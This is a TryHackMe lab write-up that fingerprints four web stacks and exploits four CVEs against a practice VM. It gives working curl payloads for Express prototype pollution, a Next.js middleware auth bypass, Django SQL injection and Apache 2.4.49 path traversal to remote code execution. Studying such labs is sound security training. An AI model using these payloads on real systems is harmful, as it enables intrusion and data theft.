# Modern Web Stacks (TryHackMe)

- **Path:** Jr Penetration Tester → Web Application Security Fundamentals
- **Room:** Modern Web Stacks — 4 stacks, 4 CVEs
- **Completed:** 2026-10-07
- **Target:** <ip> — one Ubuntu 22.04 VM, 4 services: 3000 (MERN/Express),
  3001 (Next.js), 8000 (Django), 8080 (Apache 2.4.49 in Docker)

Core workflow: **fingerprint the stack from passive HTTP signals → confirm version →
map to the exact CVE → exploit.** Faster than waiting on a scanner.

## Fingerprinting cheat sheet

| Stack | Tell-tale signals |
|---|---|
| **MERN / Express** | `X-Powered-By: Express`; cookie `connect.sid=s%3A...`; 404 = plain text `Cannot GET /x` |
| **Next.js (App Router)** | `X-Powered-By: Next.js`; `window.__next_f` in HTML; `/_next/static/chunks/`; `x-nextjs-*` headers; 307→/login |
| **Django** | `Server: WSGIServer/0.2 CPython/X.X.X`; cookie `csrftoken`; hidden `csrfmiddlewaretoken` field; `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin` (SecurityMiddleware); `/admin/` |
| **LAMP / Apache** | `Server: Apache/2.4.49 (Unix)` (also in 404 footer); `/cgi-bin/` → 403 (mod_cgi enabled, not 404) |

Automation: **Nikto** (`nikto -h http://IP:PORT`) does the fingerprint pass in <1 min —
grabs headers, server banner, cookie flags. But it has NO templates for app-level injection
(prototype pollution, SQLi) — manual takes over there.

## The 4 CVEs — root cause + exploit

### 1. MERN — Prototype Pollution (port 3000)
Recursive merge writes `__proto__` onto `Object.prototype` → every object's `.isAdmin`
resolves `true` via the prototype chain. Filtered? use `constructor.prototype`.
```bash
curl -s -c ck.txt http://IP:3000/ -o /dev/null
curl -s -b ck.txt -X POST http://IP:3000/api/user/update \
  -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
curl -s -b ck.txt http://IP:3000/api/admin/flag        # -> THM{…}
```

### 2. Next.js — CVE-2025-29927 Middleware Bypass (port 3001, CVSS 9.1)
Internal loop-prevention header `x-middleware-subrequest` was trusted from external clients →
sending it skips middleware (the entire auth layer). Value = middleware module path ×5
(`src/middleware...` if under /src). Only in production build (`npm run build && start`).
```bash
curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://IP:3001/dashboard                              # -> THM{…}
```
(Sibling: CVE-2025-55182 = unauth RCE in the RSC Flight deserialiser, CVSS 10.0 — own room.)

### 3. Django — CVE-2021-35042 SQLi via order_by() (port 8000, CVSS 9.8)
User-controlled `?order=` concatenated into `ORDER BY`. Error-based extraction with
`updatexml(1, concat(0x7e, <subquery>), 1)` — MySQL XPath error leaks the result (`~` delimiter).
Needs `DEBUG=True` to surface the error (else blind time-based `SLEEP()`).
```bash
curl -s "http://IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)"
curl -s "http://IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)"  # -> ~*(find it yourself)*
```
Then hand the injection point to sqlmap to dump. DB = *(find it yourself)*.

### 4. Apache 2.4.49 — CVE-2021-41773 Path Traversal → RCE (port 8080)
Traversal filter runs BEFORE URL-decoding → `.%2e/` bypasses it, OS resolves to `../`.
With mod_cgi on `/cgi-bin/`, traverse to `/bin/sh` and POST commands = unauth RCE (as `daemon`).
`--path-as-is` stops curl normalising the dots. Version-specific: 2.4.49 & 2.4.50 only
(2.4.50 double-encode bypass = CVE-2021-42013; 2.4.51+ patched).
```bash
curl -s --path-as-is "http://IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'            # RCE check
curl -s --path-as-is "http://IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /flag.txt' # -> THM{…}
```
The `echo Content-Type: text/plain; echo;` preamble is required (CGI needs a header block + blank line).

## Flags

| Stack | Flag |
|---|---|
| MERN (proto pollution) | `THM{…}` |
| Next.js (middleware bypass) | `THM{…}` |
| Django (SQLi) | db name *(find it yourself)* |
| Apache (path traversal RCE) | `THM{…}` |

## Takeaway
Every stack leaks its identity (header / cookie / error format / HTML artifact). Know the
stack + version → you know the attack surface before sending a payload. All 4 driven from
own PC via curl over the VPN (authorized CTF). Ties to earlier work: deserialization RCE
(Beach Bar), version→CVE (banner grabbing), SQLi concept (Protocols/recon).
